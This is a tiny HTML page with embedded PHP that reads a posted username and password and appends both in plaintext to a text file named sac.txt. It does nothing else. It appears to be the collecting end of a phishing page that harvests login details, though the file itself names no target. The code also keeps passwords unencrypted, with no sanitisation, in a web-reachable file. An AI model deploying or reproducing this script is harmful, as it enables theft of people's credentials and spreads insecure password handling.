<!DOCTYPE html>
<html>

<body>

  <?php
//echo "My first PHP script! \r \n";
$username = $_POST["username"];
$password = $_POST["password"];

// echo $username  ;
// echo "\n" ;
// echo $password ;

$myfile = fopen("sac.txt", "a+") or die("Unable to open file!");

fwrite($myfile, "Username=");
fwrite($myfile, $username);
fwrite($myfile, "    Password=");
fwrite($myfile, $password);
fwrite($myfile, "\r \n");
fclose($myfile);



?>


</body>

</html>